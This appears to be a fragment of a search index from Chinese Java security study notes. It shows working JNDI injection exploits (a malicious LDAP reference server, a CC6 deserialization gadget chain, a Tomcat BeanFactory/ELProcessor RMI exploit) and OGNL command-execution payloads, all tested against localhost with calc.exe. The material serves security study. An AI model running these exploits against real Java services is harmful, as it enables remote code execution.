= result . getRequest (). getBaseDN (); Entry e = new Entry ( base ); try { sendResult ( result , base , e ); } catch ( Exception e1 ) { e1 . printStackTrace (); } } protected void sendResult ( InMemoryInterceptedSearchResult result , String base , Entry e ) throws LDAPException , MalformedURLException { URL turl = new URL ( this . codebase , this . codebase . getRef (). replace ( '.' , '/' ). concat ( \".class\" )); System . out . println ( \"Send LDAP reference result for \" + base + \" redirecting to \" + turl ); e . addAttribute ( \"javaClassName\" , \"ExportObject\" ); String cbstring = this . codebase . toString (); int refPos = cbstring . indexOf ( '#' ); if ( refPos > 0 ) { cbstring = cbstring . substring ( 0 , refPos ); } e . addAttribute ( \"javaCodeBase\" , cbstring ); e . addAttribute ( \"objectClass\" , \"javaNamingReference\" ); //$NON-NLS-1$ e . addAttribute ( \"javaFactory\" , this . codebase . getRef ()); result . sendSearchEntry ( e ); result . setResult ( new LDAPResult ( 0 , ResultCode . SUCCESS )); } } } \u6076\u610f\u7c7b\u540c\u4e0a\u9762\u7684EvilClass.java \u5b8c\u6574\u653b\u51fb\u6d41\u7a0b : 1. \u7f16\u8bd1EvilClass.java\u4e3aEvilClass.class ( javac EvilClass.java ) 2. \u8fd0\u884c\u6076\u610fhttp server\uff0c\u6302\u8f7d\u4e0a\u8ff0class( python3 -m http.server 8000 ) 3. \u8fd0\u884c\u6076\u610frmi server(\u4e0a\u9762\u7684LDAPServer\u7c7b) 4. \u8fd0\u884c\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42(\u4e0a\u9762\u7684LDAPClient\u7c7b) 5. \u5ba2\u6237\u7aef\u5bf9\u6076\u610fLDAP server\u53d1\u9001\u8bf7\u6c42\uff0c\u83b7\u53d6\u8fdc\u7a0b\u5bf9\u8c61\u5b58\u6839\u5b9e\u4f8b 6. \u5ba2\u6237\u7aef\u4f1a\u5148\u4ece\u672c\u5730\u7684 CLASSPATH \u4e2d\u5bfb\u627e ExportObject \uff0c\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5219\u4ecejavaFactory\u5373 http://127.0.0.1:8000/EvilClass.class \u4e2d\u5bfb\u627e\u5de5\u5382\u7c7b 7. \u5ba2\u6237\u7aef\u901a\u8fc7\u5b9e\u4f8b\u5316\u5de5\u5382\u7c7b\u83b7\u53d6\u771f\u6b63\u7684\u5bf9\u8c61\uff0c\u5de5\u5382\u7c7b\u4e2d\u5305\u542b\u7684\u6076\u610f\u4ee3\u7801\u88ab\u6267\u884c","title":"\u653b\u51fb\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#serializeddata--ldap\u653b\u51fb","text":"\u8fd9\u79cd\u653b\u51fb\u65b9\u6cd5\u4e0d\u53d7jdk\u7248\u672c\u7684\u9650\u5236\uff0c\u4f46\u662f\u8981\u6c42\u76ee\u6807\u5b58\u5728\u53ef\u5229\u7528\u7684java\u7ec4\u4ef6","title":"SerializedData + LDAP\u653b\u51fb"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u9650\u5236\u6761\u4ef6_2","text":"\u5ba2\u6237\u7aef\u5b58\u5728\u53ef\u5229\u7528\u7684java\u7ec4\u4ef6","title":"\u9650\u5236\u6761\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u524d\u7f6e\u4ecb\u7ecd_1","text":"LDAP Server\u9664\u4e86\u4f7f\u7528JNDI Reference\u8fdb\u884c\u5229\u7528\u4e4b\u5916\uff0c\u8fd8\u652f\u6301\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u6570\u636e\u3002\u5982\u679cJava\u5bf9\u8c61\u7684 javaSerializedData \u5c5e\u6027\u503c\u4e0d\u4e3a\u7a7a\uff0c\u5219\u5ba2\u6237\u7aef\u7684 obj.decodeObject() \u65b9\u6cd5\u5c31\u4f1a\u5bf9\u8fd9\u4e2a\u5b57\u6bb5\u7684\u5185\u5bb9\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002\u5206\u6790\u5982\u4e0b: \u5f53\u5ba2\u6237\u7aef\u4ece\u670d\u52a1\u5668\u4e2d\u83b7\u53d6\u5230\u5bf9\u8c61\uff0c\u8fdb\u884c\u89e3\u6790\u65f6\uff0c com.sun.jndi.ldap.Obj.decodeObject() : \u6b64\u65f6\u5982\u679cjavaSerializedData\u4e0d\u4e3a\u7a7a\u5219\u8fdb\u5165\u7b2c\u4e00\u4e2a\u5206\u652f\uff0c\u5148\u6839\u636ecodebase\u5224\u65ad\u4f7f\u7528\u54ea\u4e2aClassLoader\uff0c\u8fd9\u5bf9\u4e8e\u672c\u5730\u53cd\u5e8f\u5217\u5316\u6765\u8bf4\u6ca1\u6709\u5f71\u54cd\uff0c\u63a5\u7740\u8ddf\u8fdb deserializeObject() : \u8fd9\u91cc\u76f4\u63a5\u5c06\u6211\u4eec\u4f20\u5165\u7684javaSerializedData\u53cd\u5e8f\u5217\u5316\u3002","title":"\u524d\u7f6e\u4ecb\u7ecd"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u653b\u51fb\u6d41\u7a0b_2","text":"\u5b8c\u6574\u4ee3\u7801\u5982\u4e0b : \u5ba2\u6237\u7aef: import javax.naming.Context ; import javax.naming.InitialContext ; public class LDAPClient { public static void main ( String [] args ) throws Exception { Context ctx = new InitialContext (); ctx . lookup ( \"ldap://127.0.0.1:7777/anything\" ); } } \u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aefmaven\u4f9d\u8d56: <dependency> <groupId> commons-collections </groupId> <artifactId> commons-collections </artifactId> <version> 3.1 </version> </dependency> \u670d\u52a1\u7aef: import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import java.io.ByteArrayOutputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; public class CC6 { public static byte [] getPayload () throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap = new HashMap (); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( outerMap , \"keykey\" ); Map objMap = new HashMap (); objMap . put ( tiedMapEntry , \"valuevalue\" ); outerMap . remove ( \"keykey\" ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( objMap ); oos . close (); return barr . toByteArray (); } } import com.unboundid.ldap.listener.InMemoryDirectoryServer ; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig ; import com.unboundid.ldap.listener.InMemoryListenerConfig ; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult ; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor ; import com.unboundid.ldap.sdk.Entry ; import com.unboundid.ldap.sdk.LDAPResult ; import com.unboundid.ldap.sdk.ResultCode ; import javax.net.ServerSocketFactory ; import javax.net.SocketFactory ; import javax.net.ssl.SSLSocketFactory ; import java.net.InetAddress ; import java.net.URL ; public class LDAPSerialServer { private static final String LDAP_BASE = \"dc=example,dc=com\" ; public static void main ( String [] tmp_args ) { String [] args = new String [] { \"http://127.0.0.1:8000/#EvilClass\" }; int port = 7777 ; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig ( LDAP_BASE ); config . setListenerConfigs ( new InMemoryListenerConfig ( \"listen\" , //$NON-NLS-1$ InetAddress . getByName ( \"0.0.0.0\" ), //$NON-NLS-1$ port , ServerSocketFactory . getDefault (), SocketFactory . getDefault (), ( SSLSocketFactory ) SSLSocketFactory . getDefault ())); config . addInMemoryOperationInterceptor ( new OperationInterceptor ( new URL ( args [ 0 ] ))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer ( config ); System . out . println ( \"Listening on 0.0.0.0:\" + port ); //$NON-NLS-1$ ds . startListening (); } catch ( Exception e ) { e . printStackTrace (); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase ; public OperationInterceptor ( URL cb ) { this . codebase = cb ; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result . getRequest (). getBaseDN (); Entry e = new Entry ( base ); try { sendResult ( result , base , e ); } catch ( Exception e1 ) { e1 . printStackTrace (); } } protected void sendResult ( InMemoryInterceptedSearchResult result , String base , Entry e ) throws Exception { System . out . println ( \"Send LDAP reference result for \" + base + \" return CC6 gadgets\" ); e . addAttribute ( \"javaClassName\" , \"DeserPayload\" ); //$NON-NLS-1$ e . addAttribute ( \"javaSerializedData\" , CC6 . getPayload ()); result . sendSearchEntry ( e ); result . setResult ( new LDAPResult ( 0 , ResultCode . SUCCESS )); } } } \u5b8c\u6574\u653b\u51fb\u6d41\u7a0b : 1. \u8fd0\u884c\u6076\u610fldap server(\u4e0a\u9762\u7684LDAPSerialServer\u7c7b) 2. \u8fd0\u884c\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42(\u4e0a\u9762\u7684LDAPClient\u7c7b) 3. \u5ba2\u6237\u7aef\u5bf9\u6076\u610fLDAP server\u53d1\u9001\u8bf7\u6c42\uff0c\u83b7\u53d6\u5305\u542bjavaSerializedData\u5c5e\u6027\u7684\u5bf9\u8c61 4. \u5ba2\u6237\u7aef\u89e3\u6790\u5bf9\u8c61\uff0c\u53d1\u73b0\u5b58\u5728javaSerializedData\u5c5e\u6027\uff0c\u5bf9\u5176\u8fdb\u884c\u53cd\u5e8f\u5217\u5316 5. \u89e6\u53d1\u672c\u5730\u53cd\u5e8f\u5217\u5316\u94fe","title":"\u653b\u51fb\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u672c\u5730-factory","text":"\u5728\u9ad8\u7248\u672c\u4e2d\uff08\u5982\uff1aJDK8u191\u4ee5\u4e0a\u7248\u672c\uff09\u867d\u7136\u4e0d\u80fd\u4ece\u8fdc\u7a0b\u52a0\u8f7d\u6076\u610f\u7684Factory\uff0c\u4f46\u662f\u6211\u4eec\u4f9d\u7136\u53ef\u4ee5\u5728\u8fd4\u56de\u7684Reference\u4e2d\u6307\u5b9aFactory Class\uff0c\u8fd9\u4e2a\u5de5\u5382\u7c7b\u5fc5\u987b\u5728\u53d7\u5bb3\u76ee\u6807\u672c\u5730\u7684CLASSPATH\u4e2d\u3002\u5de5\u5382\u7c7b\u5fc5\u987b\u5b9e\u73b0 javax.naming.spi.ObjectFactory \u63a5\u53e3\uff0c\u5e76\u4e14\u81f3\u5c11\u5b58\u5728\u4e00\u4e2a getObjectInstance() \u65b9\u6cd5\u3002org.apache.naming.factory.BeanFactory \u521a\u597d\u6ee1\u8db3\u6761\u4ef6\u5e76\u4e14\u5b58\u5728\u88ab\u5229\u7528\u7684\u53ef\u80fd\u3002org.apache.naming.factory.BeanFactory \u5b58\u5728\u4e8eTomcat\u4f9d\u8d56\u5305\u4e2d\uff0c\u6240\u4ee5\u4f7f\u7528\u4e5f\u662f\u975e\u5e38\u5e7f\u6cdb\u3002","title":"\u672c\u5730 Factory"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u9650\u5236\u6761\u4ef6_3","text":"\u5ba2\u6237\u7aef\u5b58\u5728\u4e00\u4e2a\u5b9e\u73b0\u4e86 javax.naming.spi.ObjectFactory \u63a5\u53e3\u4e14\u5b58\u5728 getObjectInstance() \u65b9\u6cd5\u7684\u7c7b\uff0c\u5982 org.apache.naming.factory.BeanFactory getObjectInstance() \u65b9\u6cd5\u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684\u903b\u8f91(\u5982 BeanFactory \u53ef\u4ee5\u5b9e\u4f8b\u5316\u5bf9\u8c61\u7684beanClass) \u5728 BeanFactory \u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c getObjectInstance() \u65b9\u6cd5\u4f1a\u5b9e\u4f8b\u5316\u5bf9\u8c61\u7684beanClass\u3002 \u5176\u4e2d\uff0cbeanClass\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6(\u901a\u8fc7\u5206\u6790 BeanFactory.getObjectInstance() \u5f97\u51fa): 1. \u672c\u5730classpath\u91cc\u5b58\u5728 2. \u5177\u6709\u65e0\u53c2\u6784\u9020\u65b9\u6cd5 3. \u6709\u76f4\u63a5\u6216\u95f4\u63a5\u6267\u884c\u4ee3\u7801\u7684\u65b9\u6cd5\uff0c\u5e76\u4e14\u65b9\u6cd5\u53ea\u80fd\u4f20\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u3002 \u901a\u8fc7\u4e0a\u8ff0\u7684\u63cf\u8ff0\uff0c\u5bfb\u627e\u5230\u7b26\u5408\u7684\u7c7b\u6709: 1. tomcat8\u91cc\u7684j avax.el.ELProcessor#eval(String) 2. springboot 1.2.x\u81ea\u5e26\u7684 groovy.lang.GroovyShell#evaluate(String)","title":"\u9650\u5236\u6761\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u653b\u51fb\u6d41\u7a0b_3","text":"Obj.decodeObject() \u8fd4\u56deReference\u5bf9\u8c61 \u63a5\u7740\u4f1a\u8fdb\u5165 NamingManager.getObjectFactoryFromReference() \uff0c\u5982\u679c\u662fReference\u5bf9\u8c61\uff0c\u5219\u4f1a\u8fd4\u56de\u4e00\u4e2aObjectFactory\u5bf9\u8c61\uff08\u8fd9\u91cc\u5b9e\u73b0\u7c7b\u662fBeanFactory\uff09 \u5b9e\u4f8b\u5316beanClass\u540e\uff0c\u4f1a\u83b7\u53d6Reference\u5bf9\u8c61\u91cc\u7684forceString\u5c5e\u6027\u503c \u5c06\u5c5e\u6027\u503c\u4f1a\u4ee5\u9017\u53f7\u548c\u7b49\u53f7\u5206\u5272\uff0c\u683c\u5f0f\u5982param1=methodName1,param2=methodName2 \u63a5\u7740\u4f1a\u53cd\u5c04\u8c03\u7528beanClass\u5bf9\u8c61\u91cc\u540d\u4e3amethodName1\u7684\u65b9\u6cd5\uff0c\u5e76\u4f20\u5165\u53c2\u6570\uff0c\u9650\u5b9a\u53c2\u6570\u7c7b\u578b\u4e3aString\uff0c\u53c2\u6570\u901a\u8fc7Reference\u5bf9\u8c61\u91ccparam1\u5c5e\u6027\u83b7\u53d6\u3002 \u6a21\u62df\u653b\u51fb\u6d41\u7a0b\u5982\u4e0b: 1. \u642d\u5efatomcat\u6e90\u7801\u7684\u6d4b\u8bd5\u73af\u5883(\u4e2d\u6587\u4e71\u7801\u95ee\u9898\u53c2\u8003 \u8fd9\u91cc )\uff0c\u8fd9\u91cc\u6ce8\u610f\u8981\u4fee\u6539\u4e0bpom.xml\u7684\u4f9d\u8d56(\u7f51\u4e0a\u641c\u7d22\u5230\u7684pom.xml\u4f1a\u7f3a\u4e4fLDAPServer\u7684\u4f9d\u8d56\u4e14easyMock\u7684\u7248\u672c\u8fc7\u4f4e)\uff0c\u8fd9\u662f\u6211\u4f7f\u7528\u7684\u4f9d\u8d56 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <project xmlns= \"http://maven.apache.org/POM/4.0.0\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\" > <modelVersion> 4.0.0 </modelVersion> <groupId> org.apache </groupId> <artifactId> tomcat </artifactId> <name> apache-tomcat-8.5.75 </name> <version> 8.5.75 </version> <build> <finalName> Tomcat-8.5.57 </finalName> <sourceDirectory> java </sourceDirectory> <testSourceDirectory> test </testSourceDirectory> <resources> <resource> <directory> java </directory> </resource> </resources> <testResources> <testResource> <directory> test </directory> </testResource> </testResources> <plugins> <plugin> <groupId> org.apache.maven.plugins </groupId> <artifactId> maven-compiler-plugin </artifactId> <version> 3.5.1 </version> <configuration> <encoding> UTF-8 </encoding> <source> 1.8 </source> <target> 1.8 </target> </configuration> </plugin> </plugins> </build> <dependencies> <dependency> <groupId> junit </groupId> <artifactId> junit </artifactId> <version> 4.12 </version> <scope> test </scope> </dependency> <dependency> <groupId> com.unboundid </groupId> <artifactId> unboundid-ldapsdk </artifactId> <version> 6.0.0 </version> </dependency> <dependency> <groupId> org.easymock </groupId> <artifactId> easymock </artifactId> <version> 4.3 </version> <scope> test </scope> </dependency> <dependency> <groupId> org.apache.ant </groupId> <artifactId> ant </artifactId> <version> 1.10.0 </version> </dependency> <dependency> <groupId> wsdl4j </groupId> <artifactId> wsdl4j </artifactId> <version> 1.6.2 </version> </dependency> <dependency> <groupId> javax.xml </groupId> <artifactId> jaxrpc </artifactId> <version> 1.1 </version> </dependency> <dependency> <groupId> org.eclipse.jdt.core.compiler </groupId> <artifactId> ecj </artifactId> <version> 4.6.1 </version> </dependency> <!-- https://mvnrepository.com/artifact/org.glassfish/javax.xml.rpc --> <dependency> <groupId> org.glassfish </groupId> <artifactId> javax.xml.rpc </artifactId> <version> 3.0.1-b03 </version> </dependency> </dependencies> </project> 2. \u5728\u521b\u5efajava/exp\u6587\u4ef6\u5939\u5e76\u5199\u5165RMILocalFactoryServer.java: package exp ; import com.sun.jndi.rmi.registry.ReferenceWrapper ; import org.apache.naming.ResourceRef ; import javax.naming.NamingException ; import javax.naming.Reference ; import javax.naming.StringRefAddr ; import java.rmi.AlreadyBoundException ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; import java.rmi.registry.Registry ; public class RMILocalFactoryServer { public static void main ( String [] args ) throws RemoteException , NamingException , AlreadyBoundException { // \u521b\u5efaRegistry Registry registry = LocateRegistry . createRegistry ( 9999 ); ResourceRef ref = new ResourceRef ( \"javax.el.ELProcessor\" , null , \"\" , \"\" , true , \"org.apache.naming.factory.BeanFactory\" , null ); ref . add ( new StringRefAddr ( \"forceString\" , \"KINGX=eval\" )); ref . add ( new StringRefAddr ( \"KINGX\" , \"''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('calc.exe')\" )); ReferenceWrapper referenceWrapper = new ReferenceWrapper ( ref ); registry . bind ( \"Exploit\" , referenceWrapper ); System . out . println ( \"java LocalFactory RMI registry created. port on 9999...\" ); } } 3. \u5728web/ROOT\u4e2d\u5199\u5165client.jsp: <%@ page import=\"javax.naming.*\" %> <%@ page import=\"javax.el.ELProcessor\" %> <% try { Context ctx = new InitialContext(); ctx.lookup(\"rmi://127.0.0.1:9999/Exploit\"); } catch (NamingException e) { e.printStackTrace(); } %> 4. \u8fd0\u884cRMILocalFactoryServer 5. \u8fd0\u884ctomcat\u670d\u52a1\u5668\uff0c\u8bbf\u95eehttp://127.0.0.1:8080/client.jsp\uff0c\u89e6\u53d1\u4efb\u610fjava\u4ee3\u7801\u6267\u884c","title":"\u653b\u51fb\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#\u603b\u7ed3","text":"\u6839\u636e\u76ee\u6807\u4e0d\u540c\u7684jdk\u7248\u672c\u9009\u62e9\u4e0d\u540c\u7684\u653b\u51fb\u65b9\u5f0f\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JRMP/","tags":["java"],"text":"JRMP # Java\u8fdc\u7a0b\u65b9\u6cd5\u534f\u8bae\uff08\u82f1\u8bed\uff1aJava Remote Method Protocol\uff0cJRMP\uff09\u662f\u7279\u5b9a\u4e8eJava\u6280\u672f\u7684\u3001\u7528\u4e8e\u67e5\u627e\u548c\u5f15\u7528\u8fdc\u7a0b\u5bf9\u8c61\u7684\u534f\u8bae\u3002\u8fd9\u662f\u8fd0\u884c\u5728Java\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\u4e4b\u4e0b\u3001TCP/IP\u4e4b\u4e0a\u7684\u7ebf\u8def\u5c42\u534f\u8bae\uff08\u82f1\u8bed\uff1aWire protocol\uff09\u3002 JRMP\u5168\u79f0\u4e3a Java Remote Method Protocol \uff0c\u4e5f\u5c31\u662fJava\u8fdc\u7a0b\u65b9\u6cd5\u534f\u8bae\uff0c\u901a\u4fd7\u70b9\u89e3\u91ca\uff0c\u5b83\u5c31\u662f\u4e00\u4e2a\u534f\u8bae\uff0c\u4e00\u4e2a\u5728TCP/IP\u4e4b\u4e0a\u7684\u7ebf\u8def\u5c42\u534f\u8bae\uff0c\u4e00\u4e2aRMI\u7684\u8fc7\u7a0b\uff0c\u662f\u7528\u5230JRMP\u8fd9\u4e2a\u534f\u8bae\u53bb\u7ec4\u7ec7\u6570\u636e\u683c\u5f0f\u7136\u540e\u901a\u8fc7TCP\u8fdb\u884c\u4f20\u8f93\uff0c\u4ece\u800c\u8fbe\u5230RMI\uff0c\u4e5f\u5c31\u662f\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u3002 \u6211\u4eec\u5728\u4f7f\u7528\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee\u4e00\u4e2a\u7f51\u7edc\u4e0a\u7684\u63a5\u53e3\u65f6\uff0c\u5b83\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\u4ee5\u53ca\u6570\u636e\u683c\u5f0f\u7684\u7ec4\u7ec7\uff0c\u662f\u7528\u5230\u57fa\u4e8eTCP/IP\u4e4b\u4e0a\u7684HTTP\u534f\u8bae\uff0c\u53ea\u6709\u901a\u8fc7\u8fd9\u4e2aHTTP\u534f\u8bae\uff0c\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u7aef\u7ea6\u5b9a\u597d\u7684\u4e00\u4e2a\u534f\u8bae\uff0c\u5b83\u4eec\u4e4b\u95f4\u624d\u80fd\u6b63\u5e38\u7684\u4ea4\u6d41\u901a\u8baf\u3002\u800cJRMP\u4e5f\u662f\u4e00\u4e2a\u4e0e\u4e4b\u76f8\u4f3c\u7684\u534f\u8bae\uff0c\u53ea\u4e0d\u8fc7JRMP\u8fd9\u4e2a\u534f\u8bae\u4ec5\u7528\u4e8eJava RMI\u4e2d\u3002","title":"JRMP"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JRMP/#jrmp","text":"Java\u8fdc\u7a0b\u65b9\u6cd5\u534f\u8bae\uff08\u82f1\u8bed\uff1aJava Remote Method Protocol\uff0cJRMP\uff09\u662f\u7279\u5b9a\u4e8eJava\u6280\u672f\u7684\u3001\u7528\u4e8e\u67e5\u627e\u548c\u5f15\u7528\u8fdc\u7a0b\u5bf9\u8c61\u7684\u534f\u8bae\u3002\u8fd9\u662f\u8fd0\u884c\u5728Java\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\u4e4b\u4e0b\u3001TCP/IP\u4e4b\u4e0a\u7684\u7ebf\u8def\u5c42\u534f\u8bae\uff08\u82f1\u8bed\uff1aWire protocol\uff09\u3002 JRMP\u5168\u79f0\u4e3a Java Remote Method Protocol \uff0c\u4e5f\u5c31\u662fJava\u8fdc\u7a0b\u65b9\u6cd5\u534f\u8bae\uff0c\u901a\u4fd7\u70b9\u89e3\u91ca\uff0c\u5b83\u5c31\u662f\u4e00\u4e2a\u534f\u8bae\uff0c\u4e00\u4e2a\u5728TCP/IP\u4e4b\u4e0a\u7684\u7ebf\u8def\u5c42\u534f\u8bae\uff0c\u4e00\u4e2aRMI\u7684\u8fc7\u7a0b\uff0c\u662f\u7528\u5230JRMP\u8fd9\u4e2a\u534f\u8bae\u53bb\u7ec4\u7ec7\u6570\u636e\u683c\u5f0f\u7136\u540e\u901a\u8fc7TCP\u8fdb\u884c\u4f20\u8f93\uff0c\u4ece\u800c\u8fbe\u5230RMI\uff0c\u4e5f\u5c31\u662f\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u3002 \u6211\u4eec\u5728\u4f7f\u7528\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee\u4e00\u4e2a\u7f51\u7edc\u4e0a\u7684\u63a5\u53e3\u65f6\uff0c\u5b83\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\u4ee5\u53ca\u6570\u636e\u683c\u5f0f\u7684\u7ec4\u7ec7\uff0c\u662f\u7528\u5230\u57fa\u4e8eTCP/IP\u4e4b\u4e0a\u7684HTTP\u534f\u8bae\uff0c\u53ea\u6709\u901a\u8fc7\u8fd9\u4e2aHTTP\u534f\u8bae\uff0c\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u7aef\u7ea6\u5b9a\u597d\u7684\u4e00\u4e2a\u534f\u8bae\uff0c\u5b83\u4eec\u4e4b\u95f4\u624d\u80fd\u6b63\u5e38\u7684\u4ea4\u6d41\u901a\u8baf\u3002\u800cJRMP\u4e5f\u662f\u4e00\u4e2a\u4e0e\u4e4b\u76f8\u4f3c\u7684\u534f\u8bae\uff0c\u53ea\u4e0d\u8fc7JRMP\u8fd9\u4e2a\u534f\u8bae\u4ec5\u7528\u4e8eJava RMI\u4e2d\u3002","title":"JRMP"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/","tags":["java","java\u5b89\u5168"],"text":"OGNL # maven\u5bfc\u5165 # <dependency> <groupId> ognl </groupId> <artifactId> ognl </artifactId> <version> 3.1.19 </version> </dependency> \u57fa\u672c\u8bed\u6cd5 # \u5bf9Root\u5bf9\u8c61\u7684\u8bbf\u95ee # User user = new User ( \"test\" , 23 ); System . out . println ( Ognl . getValue ( \"name\" , user )); \u5bf9\u4e0a\u4e0b\u6587\u5bf9\u8c61\u7684\u8bbf\u95ee # Map < String , Object > context = new HashMap < String , Object > (); context . put ( \"init\" , \"hello\" ); Ognl . getValue ( \"#init\" , context , null ); \u5bf9\u9759\u6001\u53d8\u91cf/\u9759\u6001\u65b9\u6cd5\u7684\u8bbf\u95ee # System . out . println ( Ognl . getValue ( \"@java.lang.Runtime@getRuntime()\" , null );); \u5bf9\u65b9\u6cd5\u7684\u8bbf\u95ee # System . out . println ( Ognl . getValue ( \"@java.lang.Runtime@getRuntime().exec('calc.exe');\" , null );); \u5bf9\u6570\u7ec4\u548c\u96c6\u5408\u7684\u8bbf\u95ee # User user = new User (); Map < String , Object > context = new HashMap < String , Object > (); String [] strings = { \"aa\" , \"bb\" }; ArrayList < String > list = new ArrayList < String > (); list . add ( \"aa\" ); list . add ( \"bb\" ); Map < String , String > map = new HashMap < String , String > (); map . put ( \"key1\" , \"value1\" ); map . put ( \"key2\" , \"value2\" ); context . put ( \"list\" , list ); context . put ( \"strings\" , strings ); context . put ( \"map\" , map ); System . out . println ( Ognl . getValue ( \"#strings[0]\" , context , user )); System . out . println ( Ognl . getValue ( \"#list[0]\" , context , user )); System . out . println ( Ognl . getValue ( \"#list[0 + 1]\" , context , user )); System . out . println ( Ognl . getValue ( \"#map['key1']\" , context , user )); System . out . println ( Ognl . getValue ( \"#map['key' + '2']\" , context , user )); \u521b\u5efa\u5bf9\u8c61 # System . out . println ( Ognl . getValue ( \"#{'key1':'value1'}\" , null )); System . out . println ( Ognl . getValue ( \"{'key1','value1'}\" , null )); System . out . println ( Ognl . getValue ( \"new sample.ognl.User()\" , null )); \u8868\u8fbe\u5f0f\u652f\u6301 # 2 + 4 // \u6574\u6570\u76f8\u52a0\uff08\u540c\u65f6\u4e5f\u652f\u6301\u51cf\u6cd5\u3001\u4e58\u6cd5\u3001\u9664\u6cd5\u3001\u53d6\u4f59 [% /mod]\u3001\uff09 \"hell\" + \"lo\" // \u5b57\u7b26\u4e32\u76f8\u52a0 i++ // \u9012\u589e\u3001\u9012\u51cf i == j // \u5224\u65ad var in list // \u662f\u5426\u5728\u5bb9\u5668\u5f53\u4e2d OGNL\u6ce8\u5165 # \u7531\u4e8eOGNL\u7684\u5f3a\u5927\u4e0e\u65b9\u4fbf\u6027\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u6784\u9020\u4e00\u4e9b\u547d\u4ee4\u6267\u884c\u7684payload: //\u4f7f\u7528runtime\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 @java.lang.Runtime@getRuntime().exec(\"calc\") //\u4f7f\u7528processbuilder\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 (new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start() //\u4f7f\u7528\u53cd\u5c04\u8c03\u7528runtime\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 